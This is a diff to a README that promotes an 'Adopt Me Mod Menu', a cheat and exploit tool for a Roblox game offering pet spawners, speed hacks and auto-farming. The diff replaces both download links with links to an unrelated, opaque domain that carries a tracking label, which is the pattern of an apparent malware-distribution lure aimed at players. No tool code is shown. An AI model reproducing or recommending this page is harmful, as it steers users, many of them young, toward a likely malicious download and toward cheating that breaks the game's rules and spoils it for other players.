@@ -2,7 +2,7 @@
 
 Welcome to the **Adopt Me Mod Menu**, a powerful and feature-rich exploit tool designed for Roblox’s most beloved role-playing game. Whether you're a casual player looking to speed things up or a dedicated collector aiming to dominate the pet economy, this mod menu offers a wide range of tools to elevate your gameplay.
 
-[![Download AdoptMe ModMenu](https://img.shields.io/badge/Download-AdoptMe%20ModMenu-blueviolet)](https://adopt-me-mod-menu.github.io/.github/)
+[![Download AdoptMe ModMenu](https://img.shields.io/badge/Download-AdoptMe%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 With functions ranging from pet spawners and teleportation to speed hacks and auto-farming, you can now enjoy a customized and optimized *Adopt Me* experience on your own terms.
 
@@ -32,4 +32,4 @@ With functions ranging from pet spawners and teleportation to speed hacks and au
 
 ---
 
-[![Download AdoptMe ModMenu](https://img.shields.io/badge/Download-AdoptMe%20ModMenu-blueviolet)](https://adopt-me-mod-menu.github.io/.github/)
+[![Download AdoptMe ModMenu](https://img.shields.io/badge/Download-AdoptMe%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
